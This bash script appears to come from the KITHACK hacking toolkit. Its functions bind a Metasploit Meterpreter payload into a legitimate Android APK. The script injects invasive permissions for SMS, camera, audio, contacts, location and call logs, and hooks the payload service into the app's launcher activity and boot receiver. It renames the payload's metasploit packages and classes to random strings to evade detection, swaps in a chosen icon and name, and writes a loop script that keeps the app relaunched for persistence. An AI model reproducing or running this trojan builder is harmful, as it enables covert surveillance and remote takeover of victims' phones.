#!/usr/bin/env bash
#Copyright 2021 KITHACK
#Written by: Adrian Guillermo
#Facebook: https://facebook.com/adrian.guillermo.22
#Github: https://github.com/AdrMXR

# COLORS
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' 
RESET="\033[00m" 
orange='\e[38;5;166m'
path=$(pwd)

# Random names
V1=$(pwgen -s 10 1) 
V2=$(pwgen -s 10 1)  
V3=$(pwgen -s 10 1) 
V4=$(pwgen -s 10 1) 
V5=$(pwgen -s 10 1) 
V6=$(pwgen -s 10 1) 
V7=$(pwgen -s 10 1) 
V8=$(pwgen -s 10 1) 

function rat() {  
# Configuration variables
path_name=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
path_dash=`head -n 2 output/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'`
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'

# Permissions
sed -i "5i\ $perms" output/original/AndroidManifest.xml

# Stirring MainActivity.smali
rm output/payload/smali/com/metasploit/stage/MainActivity.smali

# Reconfiguring smali files
sed -i "s|Lcom/metasploit|L$path_name|g" output/payload/smali/com/metasploit/stage/*.smali

# Copying stage folder to original APK folder
cp -r output/payload/smali/com/metasploit/stage output/original/smali/$path_name

# Concatenation variables 
amanifest="    </application>"
boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$path_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$path_dash.stage.MainService'"/></application>'

# Concatenating variables
sed -i "s|$amanifest|$boot_cmp|g" output/original/AndroidManifest.xml    

# Configuration variables
line_num=`grep -n "android.intent.category.LAUNCHER" output/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'`
android_activity=`grep -B $line_num "android.intent.category.LAUNCHER" output/original/AndroidManifest.xml|grep -B $line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
hook_num=`grep -n "    return-void" output/original/smali/$android_activity.smali | cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'`

# Invoking MainService 
starter="   invoke-static {}, L$path_name/stage/MainService;->start()V"
sed -i "${hook_num}i\ ${starter}" output/original/smali/$android_activity.smali
}

function icon() {
# Variables
icono=$(awk 'NR==1' /tmp/data.txt)
apk_name=$(awk 'NR==2' /tmp/data.txt)

# Scrubbing the payload contents  
mv output/payload/smali/com/metasploit output/payload/smali/com/$V1
mv output/payload/smali/com/$V1/stage output/payload/smali/com/$V1/$V2
mv output/payload/smali/com/$V1/$V2/Payload.smali output/payload/smali/com/$V1/$V2/$V3.smali
sed -i "s#/metasploit/stage#/$V1/$V2#g" output/payload/smali/com/$V1/$V2/*
sed -i "s#Payload#$V3#g" output/payload/smali/com/$V1/$V2/*
sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$V4.$V5.$V6#" output/payload/smali/com/$V1/$V2/$V3.smali
sed -i "s#payload#$V7#g" output/payload/smali/com/$V1/$V2/$V3.smali
sed -i "s#com.metasploit.stage#com.$V1.$V2#" output/payload/AndroidManifest.xml
sed -i "s#metasploit#$V8#" output/payload/AndroidManifest.xml
sed -i "s#MainActivity#$apk_name#" output/payload/res/values/strings.xml
sed -i '/.SET_WALLPAPER/d' output/payload/AndroidManifest.xml
sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' output/payload/AndroidManifest.xml
label='    <application android:label="@string/app_name">'
label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
sed -i "s|$label|$label1|g" output/payload/AndroidManifest.xml 2>&1
sed -i "s|MainActivity|$apk_name|g" output/payload/res/values/strings.xml 2>&1
mkdir output/payload/res/drawable
cp $icono output/payload/res/drawable/main_icon.png 	
}

function pers() {
package=`aapt dump badging $* | grep package | awk '{print $2}' | sed s/name=//g | sed s/\'//g`
activity=`aapt dump badging $* | grep launchable-activity: | awk '{print $2}' | sed s/name=//g | sed s/\'//g`
cd output
filename=`ls -t | head -1`
name=$(echo $filename | cut -f 1 -d '.')
(echo "#!/bin/bash"; echo "while true"; echo "do am start --user 0 -a android.intent.action.MAIN -n $package/$activity"; echo "sleep 20"; echo "done") >> $name.sh
}



